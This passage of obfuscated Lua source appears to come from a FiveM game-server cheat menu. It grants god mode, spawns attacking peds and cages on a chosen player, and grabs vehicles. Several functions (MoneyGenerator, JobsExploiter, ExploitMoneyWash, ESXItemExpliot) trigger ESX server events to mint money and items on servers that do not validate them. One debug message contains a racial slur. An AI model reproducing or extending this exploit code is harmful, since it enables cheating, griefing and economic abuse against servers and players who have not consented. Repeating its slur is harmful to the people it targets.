                end
                SetExplosiveMeleeThisFrame(PlayerId())
            end
            if VehicleGodmode and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(GetPlayerPed(-1)), true)
            end
            if SemiGod then
                if GetEntityHealth(PlayerPedId()) < 200 then
                    SetEntityHealth(PlayerPedId(), 200)
                end
            end
            if BecomeTiny then
                SetPedConfigFlag(PlayerPedId(), 223, true)
            else
                SetPedConfigFlag(PlayerPedId(), 223, false)
            end
            if SuperMan then
                if IsDisabledControlJustPressed(0.0, 201) then
                    ApplyForceToEntity(PlayerPedId(), 1, 0.0, 0.0, 10, 0.0, 0.0, 0.0, 1, true, true, true, true, true)
                    local xmdCtNUIge_8iexCd = GetHashKey("GADGET_PARACHUTE")
                    GiveDelayedWeaponToPed(PlayerPedId(), xmdCtNUIge_8iexCd, 1, 1)
                    SetPedRagdollOnCollision(PlayerPedId(), 0.0)
                    SetPedCanRagdollFromPlayerImpact(PlayerPedId(), 0.0)
                    SetPedCanRagdoll(PlayerPedId(), 0.0)
                    if IsEntityInAir(PlayerPedId() and not IsPedRagdoll(PlayerPedId())) then
                        if IsDisabledControlJustPressed(0.0, 32) then
                            ApplyforceToEntity(PlayerPedId(), 3, 0.0, 0.0)
                        end
                        if IsDisabledControlJustPressed(0.0, 33) then
                            ApplyForceToEntity(PlayerPedId(), 3, 6, 0.0)
                        end
                        if IsDisabledControlJustPressed(0.0, 21) then
                            ApplyForceToEntity(PlayerPedId(), 6, 0.0, 0.0)
                        end
                    end
                end
            end
            local Ya5JF4Vvz5ycWe07 = false
            if HulkMode then
                I0oW9H("USE F10 to grab vehicles")
                SetSuperJumpThisFrame(PlayerId())
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    if IsControlJustPressed(0.0, 57) then
                        if HulkModeEntityattached then
                            DetachEntity(vehhulkmode, true, true)
                            HulkModeEntityattached = false
                            local QtLhq4qnW = 5
                            local I = GetGameplayCamRot(2)
                            local GHbMZDjP7Mlm = -(math.sin(math.rad(I.z)) * QtLhq4qnW * 10)
                            local Pk5N = (math.cos(math.rad(I.z)) * QtLhq4qnW * 10)
                            local RCSc = QtLhq4qnW * (I.x * 0.2)
                            ResetEntityAlpha(vehhulkmode)
                            ApplyForceToEntity(
                                vehhulkmode,
                                1,
                                GHbMZDjP7Mlm,
                                Pk5N,
                                RCSc,
                                0.0,
                                0.0,
                                0.0,
                                true,
                                false,
                                true,
                                true,
                                true,
                                true
                            )
                            ApplyForceToEntity(
                                vehhulkmode,
                                tonumber(3),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(5),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                tonumber(1),
                                tonumber(1),
                                nlXCUGaxh(0.0),
                                tonumber(1)
                            )
                            ClearPedSecondaryTask(PlayerPedId())
                        else
                            local ynBBS0uk =
                                GetOffsetFromEntityInWorldCoords(
                                PlayerPedId(),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(2),
                                nlXCUGaxh(0.0)
                            )
                            vehhulkmode = GetClosestVehicle(ynBBS0uk, nlXCUGaxh(2), tonumber(0.0), tonumber(70))
                            if vehhulkmode ~= 0.0 then
                                AttachEntityToEntity(
                                    vehhulkmode,
                                    PlayerPedId(),
                                    tonumber(0.0),
                                    nlXCUGaxh(0.0),
                                    nlXCUGaxh(0.0),
                                    tonumber(1.35),
                                    nlXCUGaxh(0.0),
                                    nlXCUGaxh(0.0),
                                    tonumber(90),
                                    false,
                                    false,
                                    false,
                                    false,
                                    2,
                                    true
                                )
                                HulkModeEntityattached = true
                                TaskPlayAnim(
                                    PlayerPedId(),
                                    "random@mugging3",
                                    "handsup_standing_base",
                                    nlXCUGaxh(6),
                                    nlXCUGaxh(-6),
                                    -1,
                                    49,
                                    0.0,
                                    0.0,
                                    0.0,
                                    0.0
                                )
                                SetEntityAlpha(vehhulkmode, tonumber(200), tonumber(1))
                            end
                        end
                    end
                else
                    I0oW9H("get out of the vehicle")
                end
            else
                if HulkModeEntityattached then
                    DetachEntity(vehhulkmode, true, true)
                    HulkModeEntityattached = false
                end
            end
            if PokemonGO then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SNOWBALL"), 10, false, true)
                    local SPMqWmeg0965SzhDrzZk, l5hWn4yOJK = GetPedLastWeaponImpactCoord(PlayerPedId())
                    if SPMqWmeg0965SzhDrzZk then
                        local TRiBiL0AoOT8o = selectedpokeped
                        local hw6dP16npl77QW = selectedpokeweap
                        RequestModel(GetHashKey(TRiBiL0AoOT8o))
                        Citizen.Wait(75)
                        if HasModelLoaded(GetHashKey(TRiBiL0AoOT8o)) then
                            I0oW9H("this niggers ped has loaded")
                            local mEL =
                                CreatePed(
                                21,
                                GetHashKey(TRiBiL0AoOT8o),
                                l5hWn4yOJK.x,
                                l5hWn4yOJK.y,
                                l5hWn4yOJK.z,
                                0.0,
                                true,
                                true
                            )
                            NetworkRegisterEntityAsNetworked(mEL)
                            RequestNamedPtfxAsset("scr_rcbarry2")
                            Citizen.Wait(50)
                            UseParticleFxAssetNextCall("scr_rcbarry2")
                            StartNetworkedParticleFxNonLoopedOnEntity(
                                "scr_clown_appears",
                                mEL,
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                -0.5,
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(1),
                                false,
                                false,
                                false
                            )
                            Citizen.Wait(50)
                            if DoesEntityExist(mEL) then
                                local eV5TP0s = PedToNet(mEL)
                                NetworkSetNetworkIdDynamic(eV5TP0s, false)
                                SetNetworkIdCanMigrate(eV5TP0s, true)
                                SetNetworkIdExistsOnAllMachines(eV5TP0s, true)
                                Citizen.Wait(50)
                                NetToPed(eV5TP0s)
                                GiveWeaponToPed(mEL, GetHashKey(hw6dP16npl77QW), 9999, 1, 1)
                                SetPlayerInvincible(mEL, true)
                                SetEntityInvincible(mEL, true)
                                SetPedCanSwitchWeapon(mEL, true)
                                SetPedCombatAttributes(mEL, 46, true)
                                local mgH = GetPlayerPed(SelectedPlayer)
                                local euCcGECMozWqe7P = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                                TaskCombatPed(mEL, mgH, 0.0, 16)
                            end
                        end
                    end
                end
            else
                RemoveWeaponFromPed(GetPlayerPed(-1), GetHashKey("WEAPON_SNOWBALL"))
            end
            function CagePlayer()
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                local qk8aSN3 = "hei_prop_heist_apecrate"
                local V01g9o = GetHashKey(qk8aSN3)
                RequestModel(V01g9o)
                while not HasModelLoaded(V01g9o) do
                    Citizen.Wait(0.0)
                end
                local HemB7hprSbXNX4ZwLNwb = CreateObject(V01g9o, roundx, roundy, roundz - 0.5, true, true, false)
                SetEntityHeading(HemB7hprSbXNX4ZwLNwb, nlXCUGaxh(-90))
                FreezeEntityPosition(HemB7hprSbXNX4ZwLNwb, true)
            end
            function ESXItemExpliot()
                if CheckIfResourceExist("esx_jobs") then
                    local UCH67Z49bQaTL9pp9g = Jobs.Item[TJ]
                    local dWYnjz6hwV2D4ZKPq5 = Jobs.ItemDatabase[UCH67Z49bQaTL9pp9g]
                    if type(dWYnjz6hwV2D4ZKPq5) == "table" then
                        Citizen.CreateThread(
                            function()
                                for RMwyXn5OgdLeWwSyW, D5kik7HT in pairs(dWYnjz6hwV2D4ZKPq5) do
                                    local i3JLOOMcbTy = Jobs.ItemRequires[RMwyXn5OgdLeWwSyW]
                                    local VQMyeR = {
                                        {
                                            name = RMwyXn5OgdLeWwSyW,
                                            db_name = D5kik7HT,
                                            time = 100,
                                            max = 1337,
                                            add = 10,
                                            remove = 10,
                                            drop = 100,
                                            requires = i3JLOOMcbTy and dWYnjz6hwV2D4ZKPq5[i3JLOOMcbTy] or "nothing",
                                            requires_name = i3JLOOMcbTy and i3JLOOMcbTy or "Nothing"
                                        }
                                    }
                                    Citizen.CreateThread(
                                        function()
                                            FuckerTriggerCustomEvent(true, "esx_jobs:startWork", VQMyeR)
                                            Wait(1000)
                                            FuckerTriggerCustomEvent(true, "esx_jobs:stopWork", VQMyeR)
                                        end
                                    )
                                    Wait(3000)
                                end
                            end
                        )
                    else
                        local p_eS0aVc5yhnh = Jobs.ItemRequires[UCH67Z49bQaTL9pp9g]
                        local oNkSOrt5YULUd1wN3a0 = {
                            {
                                name = UCH67Z49bQaTL9pp9g,
                                db_name = dWYnjz6hwV2D4ZKPq5,
                                time = 100,
                                max = 1337,
                                add = 10,
                                remove = 10,
                                drop = 100,
                                requires = p_eS0aVc5yhnh and Jobs.ItemDatabase[p_eS0aVc5yhnh] or "nothing",
                                requires_name = p_eS0aVc5yhnh and p_eS0aVc5yhnh or "Nothing"
                            }
                        }
                        Citizen.CreateThread(
                            function()
                                FuckerTriggerCustomEvent(true, "esx_jobs:startWork", oNkSOrt5YULUd1wN3a0)
                                Wait(100)
                                FuckerTriggerCustomEvent(true, "esx_jobs:stopWork", oNkSOrt5YULUd1wN3a0)
                            end
                        )
                    end
                else
                    I0oW9H("Resource was not found!", 5000)
                end
            end
            ESXCustomItemsExploit = function()
                if CheckIfResourceExist("esx_jobs") then
                    local Ie48I = CustomItems.Item[yJ1LbRvZem]
                    local gSaFOpvDbfxA = CustomItems.ItemDatabase[Ie48I]
                    if type(gSaFOpvDbfxA) == "table" then
                        Citizen.CreateThread(
                            function()
                                for GjWrA, Z2JsH in pairs(gSaFOpvDbfxA) do
                                    local q9OOgF = CustomItems.ItemRequires[GjWrA]
                                    local f = {
                                        {
                                            name = GjWrA,
                                            db_name = Z2JsH,
                                            time = 100,
                                            max = 1337,
                                            add = 1,
                                            remove = 10,
                                            drop = 100,
                                            requires = q9OOgF and gSaFOpvDbfxA[q9OOgF] or "nothing",
                                            requires_name = q9OOgF and q9OOgF or "Nothing"
                                        }
                                    }
                                    Citizen.CreateThread(
                                        function()
                                            FuckerTriggerCustomEvent(true, "esx_jobs:startWork", f)
                                            Wait(1000)
                                            FuckerTriggerCustomEvent(true, "esx_jobs:stopWork", f)
                                        end
                                    )
                                    Wait(3000)
                                end
                            end
                        )
                    else
                        local Cu_qKsSnrEf = CustomItems.ItemRequires[Ie48I]
                        local HJ = {
                            {
                                name = Ie48I,
                                db_name = gSaFOpvDbfxA,
                                time = 100,
                                max = 100,
                                add = 1,
                                remove = 10,
                                drop = 100,
                                requires = Cu_qKsSnrEf and CustomItems.ItemDatabase[Cu_qKsSnrEf] or "nothing",
                                requires_name = Cu_qKsSnrEf and Cu_qKsSnrEf or "Nothing"
                            }
                        }
                        Citizen.CreateThread(
                            function()
                                FuckerTriggerCustomEvent(true, "esx_jobs:startWork", HJ)
                                Wait(100)
                                FuckerTriggerCustomEvent(true, "esx_jobs:stopWork", HJ)
                            end
                        )
                    end
                else
                    I0oW9H("Resource was not found!")
                end
            end
            MoneyGenerator = function()
                local FMsMM_uf2ALaWPpeC = kbinput("Enter amount of money", " ", 12)
                if FMsMM_uf2ALaWPpeC then
                    if FMsMM_uf2ALaWPpeC == " " then
                        FMsMM_uf2ALaWPpeC = 20000
                    end
                    I0oW9H(FMsMM_uf2ALaWPpeC)
                    if CheckIfResourceExist("esx_mugging") then
                        FuckerTriggerCustomEvent(true, "esx_mugging:giveMoney", FMsMM_uf2ALaWPpeC)
                    end
                    if CheckIfResourceExist("MF_DrugSales") or CheckIfResourceExist("MF_drugsales") then
                        FuckerTriggerCustomEvent(true, "MF_DrugSales:Sold", "water", FMsMM_uf2ALaWPpeC, 1)
                    end
                    if CheckIfResourceExist("ESX_Deliveries") then
                        FuckerTriggerCustomEvent(true, "esx_deliveries:AddCashMoney", FMsMM_uf2ALaWPpeC)
                        FuckerTriggerCustomEvent(true, "esx_deliveries:AddBankMoney", FMsMM_uf2ALaWPpeC)
                        FuckerTriggerCustomEvent(true, "esx_deliveries:finishDelivery:server")
                    end
                    if CheckIfResourceExist("esx_garbagejob") then
                        TriggerServerEvent("esx_garbagejob:pay", FMsMM_uf2ALaWPpeC)
                    end
                    if CheckIfResourceExist("MF_DrugSales") or CheckIfResourceExist("MF_drugsales") then
                        FuckerTriggerCustomEvent(true, "MF_DrugSales:Sold", "water", FMsMM_uf2ALaWPpeC, 5)
                    end
                    if CheckIfResourceExist("esx_burglary") or CheckIfResourceExist("99kr-burglary") then
                        FuckerTriggerCustomEvent(true, "99kr-burglary:addMoney", FMsMM_uf2ALaWPpeC)
                        FuckerTriggerCustomEvent(true, "burglary:money", FMsMM_uf2ALaWPpeC)
                    end
                    I0oW9H("Finished, if you wanna request a new script, contact Eulen")
                end
            end
            JobsExploiter = function()
                local jZfVVijlsYRUXV9nugBb = kbinput("how much tries", " ", 12)
                if jZfVVijlsYRUXV9nugBb then
                    if jZfVVijlsYRUXV9nugBb == " " then
                        jZfVVijlsYRUXV9nugBb = 5
                    end
                    for i = 0.0, jZfVVijlsYRUXV9nugBb do
                        if CheckIfResourceExist("esx_vangelico_robbery") or CheckIfResourceExist("esx_vangelico") then
                            FuckerTriggerCustomEvent(true, "esx_vangelico_robbery:gioielli")
                            FuckerTriggerCustomEvent(true, "esx_vangelico_robbery:gioielli1")
                            FuckerTriggerCustomEvent(true, "lester:vendita")
                            FuckerTriggerCustomEvent(true, "esx_vangelico_robbery:goldsell")
                            FuckerTriggerCustomEvent(true, "esx_vangelico_robbery:goldsell")
                            FuckerTriggerCustomEvent(true, "esx_vangelico_robbery:goldsell")
                            FuckerTriggerCustomEvent(true, "esx_vangelico_robbery:goldsell")
                        end
                        if CheckIfResourceExist("esx_minerjob") or CheckIfResourceExist("esx_mining") then
                            FuckerTriggerCustomEvent(true, "esx_mining:getItem")
                            FuckerTriggerCustomEvent(true, "esx_mining:sell")
                        end
                        if CheckIfResourceExist("Rasen") or CheckIfResourceExist("rasen") then
                            TriggerServerEvent("rasen:pay", 40)
                        end
                        if CheckIfResourceExist("utk_fh:rewardCash") then
                            TriggerServerEvent("utk_fh:rewardCash")
                        end
                    end
                end
            end
            ExploitMoneyWash = function()
                local GL_WihkBG = kbinput("Enter amount of money", " ", 12)
                if GL_WihkBG ~= " " then
                    if CheckIfResourceExist("esx_blanchisseur") or CheckIfResourceExist("esx_moneywash") then
                        FuckerTriggerCustomEvent(true, "esx_blanchisseur:washMoney", GL_WihkBG)
                        FuckerTriggerCustomEvent(true, "esx_moneywash:washMoney", GL_WihkBG)
                        FuckerTriggerCustomEvent(true, "esx_moneywash:withdraw", GL_WihkBG)
                    else
                        I0oW9H("Resource dont exist")
                    end
                else
                    I0oW9H("ERROR: try again")
                end
            end
            local jV72xaXjasm350FfT0D = SelectedDogModel
            function Canaine()
                local mfYWRH035c6gVJ6 = true
                local o6QRF1 = "ABSOLUTE"
                local IduMJC0AEVQluj4I = nil
                local A = false
                local xubhywQH4j = false
                local b = 0.0
                local uW5EQ = false
                local XiYMZUMMq35TbmwMu = false
                DogAbled = true
                DogCount = 1
                if jV72xaXjasm350FfT0D == nil then
                    jV72xaXjasm350FfT0D = "a_c_rottweiler"
                end
                function GetLocalPed()
                    return GetPlayerPed(-1)
                end
                function RequestNetworkControl(Pv_EZTd)
                    local mySyYT0WYDmTnZdH0gfw = NetworkGetNetworkIdFromEntity(IduMJC0AEVQluj4I)
                    local QROdE1smqAJpjSIVdfM = 0.0
                    NetworkRequestControlOfNetworkId(mySyYT0WYDmTnZdH0gfw)
                    while not NetworkHasControlOfNetworkId(mySyYT0WYDmTnZdH0gfw) do
                        Citizen.Wait(1)
                        NetworkRequestControlOfNetworkId(mySyYT0WYDmTnZdH0gfw)
                        QROdE1smqAJpjSIVdfM = QROdE1smqAJpjSIVdfM + 1
                        if QROdE1smqAJpjSIVdfM == 5000 then
                            Citizen.Trace("Control failed")
                            Pv_EZTd(false)
                            break
                        end
                    end
                    Pv_EZTd(true)
                end
                function GetVehicleAheadOfPlayer()
                    local YgfeX2Cwd94ylOP = GetLocalPed()
                    local Hi2 = GetEntityCoords(YgfeX2Cwd94ylOP, alive)
                    local G9KEOIJUds =
                        GetOffsetFromEntityInWorldCoords(YgfeX2Cwd94ylOP, nlXCUGaxh(0.0), nlXCUGaxh(3), nlXCUGaxh(0.0))
                    local IbYy861MOrCOmH =
                        StartShapeTestCapsule(
                        Hi2.x,
                        Hi2.y,
                        Hi2.z,
                        G9KEOIJUds.x,
                        G9KEOIJUds.y,
                        G9KEOIJUds.z,
                        1.2,
                        10,
                        YgfeX2Cwd94ylOP,
                        7
                    )
                    local Qd2xS0ykvCNw2n3mBo, CTA1xH1QY, Vgo4mqO8Cg, d0QCy7Y9wQ9ft8, p33dXg6y_JJMOPz8fQEY1 =
                        GetShapeTestResult(IbYy861MOrCOmH)
                    if CTA1xH1QY then
                        return p33dXg6y_JJMOPz8fQEY1
                    else
                        return false
                    end
                end
                function GetClosestVehicleDoor(C8)
                    local B4XdiF6FwEG9MvwL0Y = GetEntityCoords(GetLocalPed(), false)
                    local aVowyEYIztzExPugWg6Wy =
                        GetWorldPositionOfEntityBone(C8, GetEntityBoneIndexByName(C8, "door_dside_r"))
                    local S4d4p9kL6Og_L79 =
                        GetWorldPositionOfEntityBone(C8, GetEntityBoneIndexByName(C8, "door_pside_r"))
                    local Y0oLy =
                        GetDistanceBetweenCoords(
                        aVowyEYIztzExPugWg6Wy["x"],
                        aVowyEYIztzExPugWg6Wy["y"],
                        aVowyEYIztzExPugWg6Wy["z"],
                        B4XdiF6FwEG9MvwL0Y.x,
                        B4XdiF6FwEG9MvwL0Y.y,
                        B4XdiF6FwEG9MvwL0Y.z,
                        1
                    )
                    local sDbpO4WZTdsH4Q6 =
                        GetDistanceBetweenCoords(
                        S4d4p9kL6Og_L79["x"],
                        S4d4p9kL6Og_L79["y"],
                        S4d4p9kL6Og_L79["z"],
                        B4XdiF6FwEG9MvwL0Y.x,
                        B4XdiF6FwEG9MvwL0Y.y,
                        B4XdiF6FwEG9MvwL0Y.z,
                        1
                    )
                    local ei4I5yeH8bPQdEE = false
                    if (Y0oLy < sDbpO4WZTdsH4Q6) then
                        ei4I5yeH8bPQdEE = 1
                    elseif (sDbpO4WZTdsH4Q6 < Y0oLy) then
                        ei4I5yeH8bPQdEE = 2
                    end
                    return ei4I5yeH8bPQdEE
                end
                function GetPlayers()
                    local p7TUORoQrq = {}
                    for i = 0.0, 32 do
                        if NetworkIsPlayerActive(i) then
                            table.insert(p7TUORoQrq, i)
                        end
                    end
                    return p7TUORoQrq
                end
                function GetPlayerId(M3Ktr_H)
                    local lKiRfz03Fk95ZtCzQiyJu = GetPlayers()
                    for a = 1, #lKiRfz03Fk95ZtCzQiyJu do
                        local S = GetPlayerPed(lKiRfz03Fk95ZtCzQiyJu[a])
                        local N550oUytJNT7in = GetPlayerServerId(lKiRfz03Fk95ZtCzQiyJu[a])
                        if M3Ktr_H == S then
                            return N550oUytJNT7in
                        end
                    end
                    return 0.0
                end
                while not HasModelLoaded(GetHashKey(jV72xaXjasm350FfT0D)) do
                    Citizen.Wait(50)
                    RequestModel(GetHashKey(jV72xaXjasm350FfT0D))
                    BR_BkvC9lTdDDJ("[4B5] Not loaded")
                end
                local QUnpw3G8B6qYJ_g8w =
                    GetOffsetFromEntityInWorldCoords(GetLocalPed(), nlXCUGaxh(0.0), nlXCUGaxh(2), nlXCUGaxh(0.0))
                dog =
                    CreatePed(
                    28,
                    jV72xaXjasm350FfT0D,
                    QUnpw3G8B6qYJ_g8w.x,
                    QUnpw3G8B6qYJ_g8w.y,
                    QUnpw3G8B6qYJ_g8w.z,
                    GetEntityHeading(GetLocalPed()),
                    0.0,
                    1
                )
                IduMJC0AEVQluj4I = dog
                BR_BkvC9lTdDDJ("[4B5] Loaded")
                BR_BkvC9lTdDDJ("[4B5] Setting atributes")
                SetBlockingOfNonTemporaryEvents(IduMJC0AEVQluj4I, true)
                SetPedFleeAttributes(IduMJC0AEVQluj4I, 0.0, 0.0)
                SetPedRelationshipGroupHash(IduMJC0AEVQluj4I, GetHashKey("k9"))
                SetPedRelationshipGroupDefaultHash(target_ped, GetHashKey("CIVMALE"))
                BR_BkvC9lTdDDJ("[4B5] Atributes set")
                NetworkRegisterEntityAsNetworked(IduMJC0AEVQluj4I)
                while not NetworkGetEntityIsNetworked(IduMJC0AEVQluj4I) do
                    NetworkRegisterEntityAsNetworked(IduMJC0AEVQluj4I)
                    Citizen.Wait(1)
                end
                local I4K9qfO6AUNwln1P5SH = AddBlipForEntity(IduMJC0AEVQluj4I)
                SetBlipAsFriendly(I4K9qfO6AUNwln1P5SH, true)
                SetBlipSprite(I4K9qfO6AUNwln1P5SH, 442)
                BeginTextCommandSetBlipName("STRING")
                AddTextComponentString(tostring("K9 | ABSOLUTE UNIQUES"))
                EndTextCommandSetBlipName(I4K9qfO6AUNwln1P5SH)
                BR_BkvC9lTdDDJ("[4B5] Ped registered on network")
                RXx("scr_rcbarry1", "scr_alien_disintegrate", IduMJC0AEVQluj4I)
                BR_BkvC9lTdDDJ("[4B5] Particles Showed")
                A = false
                uW5EQ = false
                function PlayAnimation(qYe0z0RRGeB9UC0x, ec4Kh7RonxswC05E9__Sw)
                    RequestAnimDict(qYe0z0RRGeB9UC0x)
                    while not HasAnimDictLoaded(qYe0z0RRGeB9UC0x) do
                        Citizen.Wait(0.0)
                    end
                    TaskPlayAnim(
                        IduMJC0AEVQluj4I,
                        qYe0z0RRGeB9UC0x,
                        ec4Kh7RonxswC05E9__Sw,
                        nlXCUGaxh(8),
                        nlXCUGaxh(-8),
                        -1,
                        2,
                        nlXCUGaxh(0.0),
                        0.0,
                        0.0,
                        0.0
                    )
                end
                function DogFollow()
                    if IduMJC0AEVQluj4I ~= nil then
                        if not A then
                            local Y3QZR = false
                            RequestNetworkControl(
                                function(w_svtZS)
                                    Y3QZR = w_svtZS
                                end
                            )
                            if Y3QZR then
                                TaskFollowToOffsetOfEntity(
                                    IduMJC0AEVQluj4I,
                                    GetLocalPed(),
                                    0.5,
                                    nlXCUGaxh(0.0),
                                    nlXCUGaxh(0.0),
                                    nlXCUGaxh(5),
                                    -1,
                                    nlXCUGaxh(0.0),
                                    1
                                )
                                SetPedKeepTask(IduMJC0AEVQluj4I, true)
                                A = true
                                xubhywQH4j = false
                                BR_BkvC9lTdDDJ("[Absolute] Following")
                            end
                        else
                            local Zvgf = false
                            RequestNetworkControl(
                                function(z95Ut9bViDC1)
                                    Zvgf = z95Ut9bViDC1
                                end
                            )
                            if Zvgf then
                                SetPedKeepTask(IduMJC0AEVQluj4I, false)
                                ClearPedTasks(IduMJC0AEVQluj4I)
                                A = false
                                xubhywQH4j = false
                                BR_BkvC9lTdDDJ("[4B5] Not Following")
                            end
                        end
                    end
                end
                function AtacaCapo(PC7s4CO9)
                    if not xubhywQH4j and not uW5EQ then
                        local CyziHuzEdO8paOpWJ = false
                        RequestNetworkControl(
                            function(M5)
                                CyziHuzEdO8paOpWJ = M5
                            end
                        )
                        if CyziHuzEdO8paOpWJ then
                            SetCanAttackFriendly(IduMJC0AEVQluj4I, true, true)
                            TaskPutPedDirectlyIntoMelee(
                                IduMJC0AEVQluj4I,
                                PC7s4CO9,
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(-1),
                                nlXCUGaxh(0.0),
                                0.0
                            )
                            b = 0.0
                        end
                        xubhywQH4j = true
                        A = false
                    end
                end
                function JoinVehicle()
                    if IsPedInAnyVehicle(IduMJC0AEVQluj4I, false) then
                        TaskLeaveVehicle(IduMJC0AEVQluj4I, GetVehiclePedIsIn(IduMJC0AEVQluj4I, false), 256)
                    else
                        if not IsPedInAnyVehicle(GetLocalPed(), false) then
                            local RWofCphCzn7jD1xc = GetEntityCoords(GetLocalPed(), false)
                            local Kk1 = GetVehicleAheadOfPlayer()
                            local RAWWz4GMpcG5uBZRjeD = GetClosestVehicleDoor(Kk1)
                            if RAWWz4GMpcG5uBZRjeD ~= false then
                                if isRestricted then
                                    if CheckVehicleRestriction(Kk1, vehList) then
                                        TaskEnterVehicle(
                                            IduMJC0AEVQluj4I,
                                            Kk1,
                                            -1,
                                            RAWWz4GMpcG5uBZRjeD,
                                            nlXCUGaxh(2),
                                            1,
                                            0.0
                                        )
                                    end
                                else
                                    TaskEnterVehicle(
                                        IduMJC0AEVQluj4I,
                                        Kk1,
                                        -1,
                                        RAWWz4GMpcG5uBZRjeD,
                                        nlXCUGaxh(2),
                                        1,
                                        0.0
                                    )
                                end
                            end
                        else
                            local K5drIhfoMP25_r0fp6m = GetVehiclePedIsIn(GetLocalPed(), false)
                            local vluqa7PzAjte4w2EaR = 1
                            if isRestricted then
                                if CheckVehicleRestriction(K5drIhfoMP25_r0fp6m, vehList) then
                                    TaskEnterVehicle(
                                        IduMJC0AEVQluj4I,
                                        K5drIhfoMP25_r0fp6m,
                                        -1,
                                        vluqa7PzAjte4w2EaR,
                                        nlXCUGaxh(2),
                                        1,
                                        0.0
                                    )
                                end
                            else
                                TaskEnterVehicle(
                                    IduMJC0AEVQluj4I,
                                    K5drIhfoMP25_r0fp6m,
                                    -1,
                                    vluqa7PzAjte4w2EaR,
                                    nlXCUGaxh(2),
                                    1,
                                    0.0
                                )
                            end
                        end
                    end
                end
                function DeleteCanaine()
                    local pGUba7GfS = false
                    RequestNetworkControl(
                        function(cl)
                            pGUba7GfS = cl
                        end
                    )
                    if pGUba7GfS then
                        RXx("scr_rcbarry1", "scr_alien_disintegrate", IduMJC0AEVQluj4I)
                        SetEntityAsMissionEntity(dog, true, true)
                        DeleteEntity(dog)
                        IduMJC0AEVQluj4I = nil
                        if xubhywQH4j then
                            SetPedRelationshipGroupDefaultHash(target_ped, GetHashKey("CIVMALE"))
                            target_ped = nil
                            xubhywQH4j = false
                        end
                        A = false
                        uW5EQ = false
                        XiYMZUMMq35TbmwMu = false
                        DogAbled = false
                    end
                end
                Citizen.CreateThread(
                    function()
                        while DogAbled do
                            Citizen.Wait(1)
                            if IsControlJustPressed(1, 47) and not IsPlayerFreeAiming(PlayerId()) then
                                DogFollow()
                            end
                            if IsControlJustPressed(1, 304) then
                                JoinVehicle()
                            end
                            if IsControlJustPressed(1, 47) and IsPlayerFreeAiming(PlayerId(-1)) then
                                local uJlhb8ev, Fd5aFNM = GetEntityPlayerIsFreeAimingAt(PlayerId(-1))
                                if uJlhb8ev then
                                    if IsEntityAPed(Fd5aFNM) then
                                        AtacaCapo(Fd5aFNM)
                                    end
                                end
                            end
                        end
                    end
                )
            end
            if HornBoost and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(1, 38) then
                    I0oW9H(" press E")
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), nlXCUGaxh(80))
                end
            end
            if GodmodeSelf then
                SetPlayerInvincible(GetPlayerPed(-1), true)
                SetEntityInvincible(GetPlayerPed(-1), true)
            else
                SetPlayerInvincible(GetPlayerPed(-1), false)
                SetEntityInvincible(GetPlayerPed(-1), false)
            end
            local function zUoMrrZq5DQFtPp5FZLyK(ZVZCNYGYS7Efat3Ga8A)
                local Y6Ny5SbVM7mp = {}
                local TIded = GetGameTimer() / 2000
                Y6Ny5SbVM7mp.r = math.floor(math.sin(TIded * ZVZCNYGYS7Efat3Ga8A + 0.0) * 127 + 128)
                Y6Ny5SbVM7mp.g = math.floor(math.sin(TIded * ZVZCNYGYS7Efat3Ga8A + 2) * 127 + 128)
                Y6Ny5SbVM7mp.b = math.floor(math.sin(TIded * ZVZCNYGYS7Efat3Ga8A + 4) * 127 + 128)
                return Y6Ny5SbVM7mp
            end
            Absolute_function.PolicePursuit = function(YAs65m44F_Y7Aug)
                local esLMQ, hCNlf1CK_s90g, x4ppcjXPfEUQM9Fw9uvbk =
                    table.unpack(GetEntityCoords(GetPlayerPed(YAs65m44F_Y7Aug), false))
                local L_oNJIfotPS9dh5R6JN6F = "s_m_y_cop_01"
                RequestModel(L_oNJIfotPS9dh5R6JN6F)
                if not HasModelLoaded(L_oNJIfotPS9dh5R6JN6F) then
                    RequestModel(L_oNJIfotPS9dh5R6JN6F)
                end
                RequestModel("police4")
                if not HasModelLoaded("police4") then
                    RequestModel("police4")
                end
                Citizen.CreateThread(
                    function()
                        local KSRbvrMbkMCazm =
                            CreateVehicle(
                            GetHashKey("police4"),
                            esLMQ,
                            hCNlf1CK_s90g,
                            x4ppcjXPfEUQM9Fw9uvbk,
                            GetEntityHeading(YAs65m44F_Y7Aug),
                            true,
                            true
                        )
                        local RFscZOkm =
                            CreatePedInsideVehicle(KSRbvrMbkMCazm, 4, L_oNJIfotPS9dh5R6JN6F, -1, true, false)
                        local yATRCtK_Ha = PedToNet(RFscZOkm)
                        NetworkSetNetworkIdDynamic(yATRCtK_Ha, false)
                        SetNetworkIdCanMigrate(yATRCtK_Ha, true)
                        SetNetworkIdExistsOnAllMachines(yATRCtK_Ha, true)
                        Citizen.Wait(100)
                        NetToPed(yATRCtK_Ha)
                        RequestControlOnce(RFscZOkm)
                        SetDriverAbility(RFscZOkm, nlXCUGaxh(10))
                        SetDriverAggressiveness(RFscZOkm, nlXCUGaxh(10))
                    end
                )
            end
            if RainbowCar then
                local sQ8czrn6VqAcYv = zUoMrrZq5DQFtPp5FZLyK(nlXCUGaxh(1))
                SetVehicleCustomPrimaryColour(
                    GetVehiclePedIsUsing(PlayerPedId(-1)),
                    sQ8czrn6VqAcYv.r,
                    sQ8czrn6VqAcYv.g,
